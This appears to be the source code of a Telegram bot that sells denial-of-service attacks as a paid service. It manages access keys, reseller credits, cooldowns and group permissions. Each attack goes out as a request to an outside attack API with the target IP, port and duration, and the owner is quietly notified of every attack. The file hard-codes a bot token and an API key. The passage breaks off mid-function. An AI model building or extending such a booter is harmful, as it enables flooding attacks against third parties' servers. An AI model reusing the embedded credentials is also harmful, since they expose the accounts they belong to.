#!/usr/bin/env python3
"""
⚡ SLAYER ATTACK BOT — ULTIMATE EDITION v4
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
New API: http://HOST:PORT/attack/IP/PORT/TIME?key=KEY
Owner gets full API response per attack (silent from users)
Aesthetic box-frame messages throughout
Group system fully fixed
No API info ever shown to users
"""

import telebot, datetime, os, time, threading, json, random, string
import requests, psutil, platform, urllib3, re
from telebot import types
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════
# 🔐 CONFIGURATION
# ══════════════════════════════════════════════
BOT_TOKEN           = "8666136800:AAFH2_2rdJaNip9mWkk3seZ1dfIPer4TqHo"
OWNER_ID            = "8399117427"
_API_BASE           = "https://nethunterc2.primium.site/api/v1/attack/start"
_API_KEY            = "nk_c366088fba52c95737ab6ea0bc443ee567252848"
DISPLAY_METHOD      = "GAME"
CHANNEL_ID          = "-1003975828211"
CHANNEL_URL         = "https://t.me/+bvadn4BygOgzNGRl"

MAX_CONCURRENT_ATTACKS = 1
MAX_ATTACK_DURATION    = 300
COOLDOWN_SECONDS       = 220

THREAD_POOL = ThreadPoolExecutor(max_workers=30)

# ══════════════════════════════════════════════
# 🎨 CUSTOM EMOJI SYSTEM
# ══════════════════════════════════════════════
def CE(eid, fallback=""):
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

E = {
    "bolt":      CE("6170464829946468179","⚡"),
    "bolt2":     CE("6172418193957590216","⚡"),
    "bolt3":     CE("6174996123522959140","⚡"),
    "rocket":    CE("6147654280112248427","🚀"),
    "skull":     CE("6118209143972040877","☠️"),
    "gun":       CE("6149994221244782736","🔫"),
    "target":    CE("6242024203483095341","🎯"),
    "fire":      CE("5039644681583985437","🔥"),
    "comet":     CE("6170383642179670716","☄️"),
    "siren":     CE("6149762104032236852","🚨"),
    "key":       CE("6176966310920983412","🔑"),
    "key2":      CE("6113970367733177094","🗝"),
    "lock":      CE("5800781378278658230","🔒"),
    "unlock":    CE("5981075141767990672","🔓"),
    "green":     CE("5039928501612839813","🟢"),
    "red":       CE("5318840353510408444","🔴"),
    "yellow":    CE("5273931763146565225","🟡"),
    "blue":      CE("5274156304036800055","🔵"),
    "check":     CE("6170401663862444833","✅"),
    "check2":    CE("5219899949281453881","✅"),
    "cross":     CE("5040042498634810056","❌"),
    "warning":   CE("5188463524568926712","⚠️"),
    "noentry":   CE("6010328889870522108","⛔"),
    "crown":     CE("5431684550424011313","👑"),
    "crown2":    CE("6300766415355908268","👑"),
    "trophy":    CE("6089185885289454318","🏆"),
    "medal":     CE("6179279816529814743","🥇"),
    "star":      CE("6269219640048622278","⭐️"),
    "star2":     CE("6237678237745422630","🌟"),
    "gem":       CE("5348296214183950233","💎"),
    "gem2":      CE("5364040533498932357","💎"),
    "id":        CE("6240008528086440502","✍️"),
    "chart":     CE("6170318672209384384","📈"),
    "chart2":    CE("6093382540784046658","📊"),
    "clipboard": CE("5926764846518376076","📋"),
    "pin":       CE("6242460095418996425","❣️"),
    "bell":      CE("5042111805288089118","🔔"),
    "globe":     CE("6113923977791409854","🌐"),
    "clock":     CE("5445350406215465190","⏰"),
    "hourglass": CE("5042036407137207122","⏳"),
    "stopwatch": CE("5267421370114914946","⏱"),
    "calendar":  CE("5800810214689084012","📅"),
    "refresh":   CE("6008230201345971113","🔄"),
    "gear":      CE("6010365092149858918","⚙️"),
    "gift":      CE("5193085063998224234","🎁"),
    "party":     CE("5039778134807806727","🎉"),
    "user":      CE("5818715087237549366","👤"),
    "money":     CE("6170022585753932048","🤑"),
    "moneybag":  CE("5039789890133296083","💰"),
    "hundred":   CE("6169996644151465371","💯"),
    "top":       CE("6170046190894191839","🔝"),
    "eye":       CE("6269330768032438825","👁"),
    "card":      CE("6170133383025267499","🃏"),
    "heart":     CE("5039643719511311434","💖"),
    "spin":      CE("6116290994397781357","🌀"),
    "lightbulb": CE("4958665796227171144","💡"),
    "arrow":     CE("6258079104768155505","➡️"),
    "shop":      CE("5208573502046610594","🏪"),
    "bot_e":     CE("5431490770089560625","🤖"),
    "devil":     CE("6336664426325740768","😈"),
    "snake":     CE("5116298753917060171","🐍"),
    "camera":    CE("5818849313555483639","📸"),
    "plane":     CE("5260702568090188421","✈️"),
    "handshake": CE("6086668836885500499","🤝"),
    "people":    CE("5992129361090711368","👤"),
}

SPINNERS = ["◐","◓","◑","◒","⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]

BAR_STYLES = [
    ("▰","▱",10),
    ("█","▒",10),
    ("◼","◻",10),
    ("●","○",10),
    ("━","─",10),
]
_uid_bar_style = {}

def get_bar_style(uid):
    if uid not in _uid_bar_style:
        _uid_bar_style[uid] = random.choice(BAR_STYLES)
    return _uid_bar_style[uid]

def progress_bar(pct, uid=None):
    fc, ec, length = get_bar_style(uid) if uid else ("▰","▱",10)
    filled = int(pct * length / 100)
    return "[" + fc * filled + ec * (length - filled) + "]"

def spinner(tick):
    return SPINNERS[tick % len(SPINNERS)]

def fmt_time(seconds):
    seconds = max(0, int(seconds))
    if seconds < 60:    return f"{seconds}s"
    elif seconds < 3600: return f"{seconds//60}m {seconds%60}s"
    else:
        h = seconds // 3600; r = seconds % 3600
        return f"{h}h {r//60}m {r%60}s"

def B(s): return f"<b>{s}</b>"
def C(s): return f"<code>{s}</code>"
def I(s): return f"<i>{s}</i>"

# ══════════════════════════════════════════════
# 📂 FILE PATHS
# ══════════════════════════════════════════════
CO_OWNERS_FILE     = "/root/bots/slayer/co_owners.json"
USER_FILE          = "/root/bots/slayer/users.json"
KEYS_FILE          = "/root/bots/slayer/keys.json"
TRIAL_KEYS_FILE    = "/root/bots/slayer/trial_keys.json"
TRIAL_USERS_FILE   = "/root/bots/slayer/trial_users.json"
LOG_FILE           = "/root/bots/slayer/logs.txt"
RESELLER_FILE      = "/root/bots/slayer/resellers.json"
BALANCE_FILE       = "/root/bots/slayer/balances.json"
BANNED_FILE        = "/root/bots/slayer/banned_users.json"
STARTED_USERS_FILE = "/root/bots/slayer/started_users.json"
FAIL_LOG_FILE      = "/root/bots/slayer/fail_logs.txt"
GROUPS_FILE        = "/root/bots/slayer/groups.json"

RESELLER_KEY_OPTIONS = {
    "12h": {"hours":12,  "credits":50},
    "24h": {"hours":24,  "credits":100},
    "1d":  {"hours":24,  "credits":100},
    "2d":  {"hours":48,  "credits":200},
    "3d":  {"hours":72,  "credits":300},
    "4d":  {"hours":96,  "credits":400},
    "5d":  {"hours":120, "credits":500},
    "6d":  {"hours":144, "credits":600},
    "7d":  {"hours":168, "credits":700},
    "8d":  {"hours":192, "credits":800},
    "9d":  {"hours":216, "credits":900},
    "10d": {"hours":240, "credits":1000},
    "14d": {"hours":336, "credits":1400},
    "15d": {"hours":360, "credits":1500},
    "20d": {"hours":480, "credits":2000},
    "21d": {"hours":504, "credits":2100},
    "25d": {"hours":600, "credits":2500},
    "30d": {"hours":720, "credits":3000},
}

# ══════════════════════════════════════════════
# 💾 RUNTIME STATE
# ══════════════════════════════════════════════
active_attacks    = {}   # uid → {target, port, duration, start_time, chat_id}
user_cooldowns    = {}   # uid → expire_timestamp
pending_feedback  = {}   # uid → True
last_attack       = {}   # uid → {target, port, duration, time, end_timestamp}
pending_approval  = {}   # uid → {file_id, target, port, time}
maintenance_mode  = False
feedback_required = True
force_join        = False
bot_start_time    = time.time()

group_active_attacks = {}   # chat_id → {uid: {...}}
group_cooldowns      = {}   # (chat_id, uid) → expire_timestamp

# ══════════════════════════════════════════════
# 📁 JSON HELPERS
# ══════════════════════════════════════════════
def load(path, default):
    try:
        with open(path,'r') as f: return json.load(f)
    except: return default

def save(path, data):
    with open(path,'w') as f: json.dump(data, f, indent=2)

def init_files():
    pairs = [
        (USER_FILE,         {}),
        (KEYS_FILE,         {"used":{},"unused":{}}),
        (TRIAL_KEYS_FILE,   {"used":{},"unused":{}}),
        (TRIAL_USERS_FILE,  []),
        (RESELLER_FILE,     {}),
        (BALANCE_FILE,      {}),
        (BANNED_FILE,       {}),
        (CO_OWNERS_FILE,    []),
        (STARTED_USERS_FILE,[]),
        (GROUPS_FILE,       {}),
    ]
    for path, default in pairs:
        if not os.path.exists(path): save(path, default)
    for f in [LOG_FILE, FAIL_LOG_FILE]:
        if not os.path.exists(f): open(f,'w').close()

init_files()

# ══════════════════════════════════════════════
# 🛡️ ROLES
# ══════════════════════════════════════════════
def co_owners():        return load(CO_OWNERS_FILE, [])
def save_co_owners(d):  save(CO_OWNERS_FILE, d)
def is_co_owner(uid):   return str(uid) in co_owners()
def is_admin(uid):      return str(uid) == OWNER_ID or is_co_owner(uid)
def is_reseller(uid):   return str(uid) in load(RESELLER_FILE, {})

def get_role(uid):
    uid = str(uid)
    if uid == OWNER_ID:    return "Owner"
    if is_co_owner(uid):   return "Co-Owner"
    if is_reseller(uid):   return "Reseller"
    return "User"

# ══════════════════════════════════════════════
# 👥 GROUP SYSTEM
# ══════════════════════════════════════════════
def get_groups():         return load(GROUPS_FILE, {})
def save_groups(d):       save(GROUPS_FILE, d)
def get_group_cfg(cid):   return get_groups().get(str(cid))

def add_group(chat_id, max_slots, max_time, cooldown):
    groups = get_groups()
    groups[str(chat_id)] = {
        "max_slots": max_slots,
        "max_time":  max_time,
        "cooldown":  cooldown,
        "added_on":  datetime.datetime.now().isoformat()
    }
    save_groups(groups)
    # Notify group
    try:
        bot.send_message(chat_id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} {E['party']} GROUP APPROVED           ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['fire']}      Slots    : {B(str(max_slots))}\n"
            f"   {E['clock']}     Max Time : {B(fmt_time(max_time))}\n"
            f"   {E['hourglass']} Cooldown : {B(fmt_time(cooldown))}\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{E['rocket']} Attack system enabled for this group!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode='HTML')
    except: pass

def remove_group(chat_id):
    groups = get_groups()
    if str(chat_id) in groups:
        del groups[str(chat_id)]
        save_groups(groups)
        # Notify group
        try:
            bot.send_message(chat_id,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} {E['noentry']} GROUP UNAPPROVED         ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"{E['noentry']} Attack system disabled for this group\n"
                f"{E['bell']} Contact admin to re-enable",
                parse_mode='HTML')
        except: pass
        return True
    return False

def group_active_count(chat_id):
    return len(group_active_attacks.get(str(chat_id), {}))

def group_cooldown_remaining(chat_id, uid):
    key = (str(chat_id), str(uid))
    if key in group_cooldowns:
        return max(0, group_cooldowns[key] - time.time())
    return 0

# ══════════════════════════════════════════════
# 💰 BALANCE
# ══════════════════════════════════════════════
def get_balance(uid):
    if is_admin(uid): return 999_999_999
    return load(BALANCE_FILE, {}).get(str(uid), 0)

def add_balance(uid, amount):
    if is_admin(uid): return 999_999_999
    b = load(BALANCE_FILE, {})
    b[str(uid)] = b.get(str(uid), 0) + amount
    save(BALANCE_FILE, b)
    return b[str(uid)]

def deduct_balance(uid, amount):
    if is_admin(uid): return True
    b = load(BALANCE_FILE, {})
    if b.get(str(uid), 0) >= amount:
        b[str(uid)] -= amount
        save(BALANCE_FILE, b)
        return True
    return False

# ══════════════════════════════════════════════
# 🔑 KEY MANAGEMENT
# ══════════════════════════════════════════════
def _calc_expiry(info):
    unit, dur = info["unit"], info["duration"]
    now = datetime.datetime.now()
    if unit == "min":    return now + datetime.timedelta(minutes=dur)
    elif unit == "hour": return now + datetime.timedelta(hours=dur)
    return now + datetime.timedelta(days=dur)

def gen_keys_admin(prefix, duration, unit, count, max_users=1):
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    keys = []
    for _ in range(count):
        rp  = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"{prefix}-{rp}"
        keys.append(key)
        kd["unused"][key] = {
            "duration":duration,"unit":unit,
            "generated":datetime.datetime.now().isoformat(),
            "generated_by":"admin","max_users":max_users,
            "redeemed_count":0,"redeemed_users":[]
        }
    save(KEYS_FILE, kd)
    return keys

def gen_trial_keys_admin(prefix, duration, unit, count, max_users=1):
    td = load(TRIAL_KEYS_FILE, {"used":{},"unused":{}})
    keys = []
    for _ in range(count):
        rp  = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        key = f"TRIAL-{prefix}-{rp}"
        keys.append(key)
        td["unused"][key] = {
            "duration":duration,"unit":unit,
            "generated":datetime.datetime.now().isoformat(),
            "max_users":max_users,"redeemed_count":0,"redeemed_users":[]
        }
    save(TRIAL_KEYS_FILE, td)
    return keys

def delete_all_trial_keys():
    td    = load(TRIAL_KEYS_FILE, {"used":{},"unused":{}})
    users = load(USER_FILE, {})
    for key, info in td.get("used",{}).items():
        for uid in info.get("redeemed_users",[]):
            if uid in users: del users[uid]
    save(USER_FILE, users)
    save(TRIAL_KEYS_FILE, {"used":{},"unused":{}})
    save(TRIAL_USERS_FILE, [])

def is_trial_used_by(uid):
    return str(uid) in load(TRIAL_USERS_FILE, [])

def mark_trial_used(uid):
    tu = load(TRIAL_USERS_FILE, [])
    if str(uid) not in tu:
        tu.append(str(uid))
        save(TRIAL_USERS_FILE, tu)

def is_trial_user(uid):
    return load(USER_FILE, {}).get(str(uid), {}).get("trial", False)

def gen_keys_reseller(uid, option_key, count):
    if option_key not in RESELLER_KEY_OPTIONS:
        return None, f"{E['noentry']} Invalid key type"
    option = RESELLER_KEY_OPTIONS[option_key]
    cost   = option["credits"] * count
    if not deduct_balance(uid, cost):
        return None, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} INSUFFICIENT BALANCE          ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"{E['money']} Required  : {B(str(cost))} credits\n"
            f"{E['moneybag']} Available : {B(str(get_balance(uid)))} credits"
        )
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    keys = []
    for _ in range(count):
        prefix = random.choice(["FlooderPvt","Rolaxx"])
        rp     = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        key    = f"{prefix}-{rp}"
        keys.append(key)
        kd["unused"][key] = {
            "duration":option["hours"],"unit":"hour",
            "generated":datetime.datetime.now().isoformat(),
            "generated_by":str(uid),"max_users":1,
            "redeemed_count":0,"redeemed_users":[]
        }
    save(KEYS_FILE, kd)
    return keys, None

def increase_key_duration(key, add):
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    for bucket in ("unused","used"):
        if key in kd[bucket]:
            kd[bucket][key]["duration"] += add
            save(KEYS_FILE, kd)
            return True
    return False

def decrease_key_duration(key, dec):
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    for bucket in ("unused","used"):
        if key in kd[bucket]:
            kd[bucket][key]["duration"] = max(0, kd[bucket][key]["duration"] - dec)
            save(KEYS_FILE, kd)
            return True
    return False

def increase_all_keys(dur):
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    count = 0
    for bucket in ("used","unused"):
        for key in kd[bucket]:
            kd[bucket][key]["duration"] += dur; count += 1
    save(KEYS_FILE, kd); return count

def decrease_all_keys(dur):
    kd = load(KEYS_FILE, {"used":{},"unused":{}})
    count = 0
    for bucket in ("used","unused"):
        for key in kd[bucket]:
            kd[bucket][key]["duration"] = max(0, kd[bucket][key]["duration"] - dur); count += 1
    save(KEYS_FILE, kd); return count

def redeem_key(uid, key, username=None):
    kd    = load(KEYS_FILE, {"used":{},"unused":{}})
    td    = load(TRIAL_KEYS_FILE, {"used":{},"unused":{}})
    users = load(USER_FILE, {})
    sid   = str(uid)

    if key in kd.get("used",{}) and kd["used"][key].get("redeemed_count",1) >= kd["used"][key].get("max_users",1):
        return "used", None
    if key in td.get("used",{}) and td["used"][key].get("redeemed_count",1) >= td["used"][key].get("max_users",1):
        return "used", None

    if sid in users and not users[sid].get("banned",False):
        try:
            expiry = datetime.datetime.fromisoformat(users[sid]["expiry"])
            if datetime.datetime.now() < expiry:
                return "already_active", None
        except: pass
        old_key = users[sid].get("key")
        for f, store in [(KEYS_FILE, kd),(TRIAL_KEYS_FILE, td)]:
            for bucket in ("used","unused"):
                if old_key and old_key in store.get(bucket,{}):
                    del store[bucket][old_key]
            save(f, store)
        del users[sid]; save(USER_FILE, users)
        kd    = load(KEYS_FILE, {"used":{},"unused":{}})
        td    = load(TRIAL_KEYS_FILE, {"used":{},"unused":{}})
        users = load(USER_FILE, {})

    def _do_redeem(store, store_file, key, is_trial):
        info   = store["unused"][key]
        expiry = _calc_expiry(info)
        rc     = info.get("redeemed_count",0) + 1
        ru     = info.get("redeemed_users",[]) + [sid]
        if rc >= info.get("max_users",1):
            store["used"][key] = {**info,"used_by":uid,
                                  "used_at":datetime.datetime.now().isoformat(),
                                  "expiry":expiry.isoformat(),
                                  "redeemed_count":rc,"redeemed_users":ru}
            del store["unused"][key]
        else:
            store["unused"][key]["redeemed_count"] = rc
            store["unused"][key]["redeemed_users"]  = ru
        users[sid] = {"expiry":expiry.isoformat(),"key":key,"banned":False,
                      "trial":is_trial,"username":username,
                      "redeemed_on":datetime.datetime.now().isoformat()}
        save(store_file, store); save(USER_FILE, users)
        return expiry

    if key in kd.get("unused",{}):
        expiry = _do_redeem(kd, KEYS_FILE, key, False)
        return "success", expiry

    if key in td.get("unused",{}):
        if is_trial_used_by(uid): return "trial_already_used", None
        expiry = _do_redeem(td, TRIAL_KEYS_FILE, key, True)
        mark_trial_used(uid)
        return "success", expiry

    return "invalid", None

def remove_user_key(uid):
    users = load(USER_FILE, {})
    sid   = str(uid)
    if sid not in users: return False
    key = users[sid].get("key")
    if key:
        for f, store_key in [(KEYS_FILE,"used"),(TRIAL_KEYS_FILE,"used")]:
            d = load(f, {"used":{},"unused":{}})
            if key in d.get(store_key,{}):
                del d[store_key][key]; save(f, d)
    del users[sid]; save(USER_FILE, users)
    return True

def is_user_allowed(uid):
    if is_admin(uid): return True, None
    if str(uid) in load(BANNED_FILE, {}): return False, None
    users = load(USER_FILE, {})
    user  = users.get(str(uid))
    if not user or user.get("banned",False): return False, None
    try:
        expiry = datetime.datetime.fromisoformat(user["expiry"])
        if datetime.datetime.now() > expiry:
            remove_user_key(uid)
            return False, None
        return True, expiry
    except: return False, None

def extend_all_users(dur, unit):
    users = load(USER_FILE, {}); kd = load(KEYS_FILE, {"used":{},"unused":{}})
    count = 0
    for uid, info in list(users.items()):
        if info.get("banned"): continue
        try:
            cur = datetime.datetime.fromisoformat(info["expiry"])
            if datetime.datetime.now() > cur: continue
            if unit == "min":    new = cur + datetime.timedelta(minutes=dur)
            elif unit == "hour": new = cur + datetime.timedelta(hours=dur)
            else:                new = cur + datetime.timedelta(days=dur)
            users[uid]["expiry"] = new.isoformat()
            key = info.get("key")
            if key and key in kd.get("used",{}):
                kd["used"][key]["expiry"] = new.isoformat()
            count += 1
        except: pass
    save(USER_FILE, users); save(KEYS_FILE, kd)
    return count

# ══════════════════════════════════════════════
# ⚡ API ENGINE — NEW FORMAT
# http://HOST:PORT/attack/IP/PORT/TIME?key=KEY
# Owner gets full response, users see nothing
# ══════════════════════════════════════════════
def _do_api_call(target, port, duration, uid, retries=3):
    url = f"{_API_BASE}?key={_API_KEY}&ip={target}&port={port}&time={duration}"
    headers = {'User-Agent':'Mozilla/5.0','Connection':'keep-alive'}
    last_err = ""
    for attempt in range(retries):
        try:
            resp = requests.get(url, timeout=12, verify=False, headers=headers)
            try:
                resp_json = resp.json()
                resp_text = json.dumps(resp_json, indent=2)
            except:
                resp_text = resp.text[:500] if resp.text else "Empty response"
            with open(LOG_FILE,"a") as f:
                f.write(f"[{datetime.datetime.now()}] OK attempt={attempt+1} uid={uid} {target}:{port} {duration}s status={resp.status_code}\n")
            return True, "", resp.status_code, resp_text
        except requests.exceptions.Timeout:
            last_err = f"Timeout (attempt {attempt+1})"
        except requests.exceptions.ConnectionError as e:
            last_err = f"ConnErr: {str(e)[:80]}"
        except Exception as e:
            last_err = f"Error: {str(e)[:80]}"
        if attempt < retries-1: time.sleep(0.4)
    with open(FAIL_LOG_FILE,"a") as f:
        f.write(f"[{datetime.datetime.now()}] FAIL uid={uid} {target}:{port} {duration}s err={last_err}\n")
    return False, last_err, 0, ""

def _notify_owner_api_response(target, port, duration, uid, username, status_code, resp_text, success=True):
    """Send full API response to owner after every attack — silent, never to users."""
    try:
        status_label = f"{E['check']} SUCCESS" if success else f"{E['cross']} FAILED"
        msg = (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['bolt']} API ATTACK LOG                ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['target']} Target    : {C(target)}\n"
            f"   {E['gear']}  Port      : {C(str(port))}\n"
            f"   {E['clock']} Duration  : {C(fmt_time(duration))}\n"
            f"   {E['user']}  User ID   : {C(str(uid))}\n"
            f"   {E['id']}   Username  : @{username or 'N/A'}\n"
            f"   {E['chart2']} Status    : {status_label}\n"
            f"   {E['globe']} HTTP Code : {C(str(status_code))}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{E['clipboard']} {B('API Response:')}\n"
            f"<code>{resp_text[:600]}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(int(OWNER_ID), msg, parse_mode='HTML')
    except:
        pass

def fire_api(target, port, duration, uid, username=None):
    success, err, status_code, resp_text = _do_api_call(target, port, duration, uid)
    if not success:
        _notify_owner_api_response(target, port, duration, uid, username, status_code, err or "No response", success=False)
    else:
        _notify_owner_api_response(target, port, duration, uid, username, status_code, resp_text, success=True)

# ══════════════════════════════════════════════
# 🎨 AESTHETIC MESSAGE BUILDERS
# ══════════════════════════════════════════════
def _loc_label(is_group, group_name=None):
    if is_group:
        return f"🌐 {group_name or 'Group Chat'}"
    return f"{E['lock']} Private Chat"

def build_progress_msg(target, port, duration, elapsed, uid, username=None, is_group=False, group_name=None, tick=0):
    remaining = max(0, duration - int(elapsed))
    pct       = min(100, int((elapsed / max(duration,1)) * 100))
    bar       = progress_bar(pct, uid)
    sp        = spinner(tick)
    loc       = _loc_label(is_group, group_name)

    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['bolt']} {E['rocket']} ATTACK IN PROGRESS {sp}      ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"{E['pin']} {B('LOCATION')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   └─ {loc}",
        f"",
        f"{E['target']} {B('TARGET DETAILS')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   ├─ {E['target']} Target    : {C(target)}",
        f"   ├─ {E['gear']}  Port      : {C(str(port))}",
        f"   ├─ {E['fire']}  Method    : {C(DISPLAY_METHOD)}",
        f"   ├─ {E['stopwatch']} Duration  : {C(fmt_time(duration))}",
        f"   └─ {E['hourglass']} Remaining : {C(fmt_time(remaining))}",
    ]
    if is_group and username:
        lines.append(f"")
        lines.append(f"{E['user']} {B('ATTACKER')}")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"   └─ @{username}")

    lines += [
        f"",
        f"───────────────────────────────",
        f"{E['chart2']} {B('PROGRESS')}",
        f"   {C(bar + ' ' + str(pct) + '%')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]

    if is_trial_user(uid) and feedback_required:
        lines.insert(-1, f"")
        lines.insert(-1, f"{E['camera']} {B('Screenshot required after attack')}")

    return "\n".join(lines)

def build_finished_msg(target, port, duration, uid, ts, is_group=False, group_name=None):
    loc = _loc_label(is_group, group_name)
    cd  = COOLDOWN_SECONDS if not is_group else 0

    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['check']} {E['target']} ATTACK COMPLETED         ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"{E['pin']} {B('LOCATION')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   └─ {loc}",
        f"",
        f"{E['target']} {B('TARGET DETAILS')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   ├─ {E['target']} Target    : {C(target)}",
        f"   ├─ {E['gear']}  Port      : {C(str(port))}",
        f"   ├─ {E['fire']}  Method    : {C(DISPLAY_METHOD)}",
        f"   ├─ {E['stopwatch']} Duration  : {C(fmt_time(duration))}",
        f"   └─ {E['calendar']} Finished  : {C(ts)}",
        f"",
        f"───────────────────────────────",
        f"{E['party']} {B('TARGET HIT SUCCESSFULLY')}",
        f"",
        f"───────────────────────────────",
        f"{E['refresh']} {B('COOLDOWN ACTIVE')}",
        f"   {E['stopwatch']} Wait Time : {C(fmt_time(cd))}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    if is_trial_user(uid) and feedback_required:
        lines.insert(-1, f"")
        lines.insert(-1, f"{E['camera']} {B('Send screenshot to unlock next attack')}")
    return "\n".join(lines)

def build_finished_msg_group(target, port, duration, uid, ts, cfg, group_name=None):
    loc = _loc_label(True, group_name)
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['check']} {E['target']} ATTACK COMPLETED         ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"{E['pin']} {B('LOCATION')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   └─ {loc}",
        f"",
        f"{E['target']} {B('TARGET DETAILS')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   ├─ {E['target']} Target    : {C(target)}",
        f"   ├─ {E['gear']}  Port      : {C(str(port))}",
        f"   ├─ {E['fire']}  Method    : {C(DISPLAY_METHOD)}",
        f"   ├─ {E['stopwatch']} Duration  : {C(fmt_time(duration))}",
        f"   └─ {E['calendar']} Finished  : {C(ts)}",
        f"",
        f"───────────────────────────────",
        f"{E['party']} {B('TARGET HIT SUCCESSFULLY')}",
        f"",
        f"───────────────────────────────",
        f"{E['refresh']} {B('COOLDOWN ACTIVE')}",
        f"   {E['stopwatch']} Wait Time : {C(fmt_time(cfg['cooldown']))}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    if feedback_required:
        lines.insert(-1, f"")
        lines.insert(-1, f"{E['camera']} {B('Send screenshot to unlock next attack')}")
    return "\n".join(lines)

def no_plan_msg():
    return (
        f"╔══════════════════════════════════╗\n"
        f"║  {E['cross']} {E['key']} NO ACTIVE PLAN           ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"{E['noentry']} You don't have an active plan\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"\n"
        f"   {E['key']}  Get a key from admin and use /redeem\n"
        f"   {E['plane']} Contact admin to purchase\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

# ══════════════════════════════════════════════
# ⚡ ATTACK FLOW — PROGRESS RUNNER
# ══════════════════════════════════════════════
def run_attack_progress(chat_id, msg_id, target, port, duration, uid, start,
                        username=None, is_group=False, group_chat_id=None, group_name=None):
    tick      = 0
    last_edit = 0
    while True:
        elapsed = time.time() - start
        if elapsed >= duration: break
        now_t = time.time()
        if now_t - last_edit >= 5:
            last_edit = now_t
            txt = build_progress_msg(target, port, duration, elapsed, uid,
                                     username, is_group, group_name, tick)
            try: bot.edit_message_text(txt, chat_id, msg_id, parse_mode='HTML')
            except: pass
        tick += 1
        time.sleep(1)

    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    last_attack[uid] = {"target":target,"port":port,"duration":duration,
                        "time":ts,"end_timestamp":time.time()}

    if is_group and group_chat_id:
        cfg = get_group_cfg(group_chat_id)
        if cfg:
            final_txt = build_finished_msg_group(target, port, duration, uid, ts, cfg, group_name)
            if feedback_required:
                pending_feedback[uid] = True
            group_active_attacks.setdefault(str(group_chat_id), {}).pop(str(uid), None)
            key = (str(group_chat_id), str(uid))
            group_cooldowns[key] = time.time() + cfg["cooldown"]
        else:
            final_txt = build_finished_msg(target, port, duration, uid, ts, True, group_name)
            group_active_attacks.setdefault(str(group_chat_id), {}).pop(str(uid), None)
    else:
        final_txt = build_finished_msg(target, port, duration, uid, ts, False)
        if is_trial_user(uid) and feedback_required:
            pending_feedback[uid] = True
        active_attacks.pop(uid, None)
        _uid_bar_style.pop(uid, None)
        if not is_admin(uid):
            user_cooldowns[uid] = time.time() + COOLDOWN_SECONDS

    try: bot.edit_message_text(final_txt, chat_id, msg_id, parse_mode='HTML')
    except:
        try: bot.send_message(chat_id, final_txt, parse_mode='HTML')
        except: pass

# ══════════════════════════════════════════════
# ⚡ ATTACK FLOW — DM
# ══════════════════════════════════════════════
def can_attack_dm(uid, duration):
    if is_admin(uid): return True, None
    if is_reseller(uid):
        if duration > MAX_ATTACK_DURATION:
            return False, (
                f"╔══════════════════════════════════╗\n"
                f"║  {E['noentry']} DURATION LIMIT               ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['clock']} Max allowed: {C(fmt_time(MAX_ATTACK_DURATION))}"
            )
        if uid in user_cooldowns and user_cooldowns[uid] > time.time():
            rem = user_cooldowns[uid] - time.time()
            return False, (
                f"╔══════════════════════════════════╗\n"
                f"║  {E['hourglass']} COOLDOWN ACTIVE               ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['stopwatch']} Wait : {C(fmt_time(rem))}\n"
                f"{E['chart2']} Use /status to monitor"
            )
        if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
            return False, (
                f"╔══════════════════════════════════╗\n"
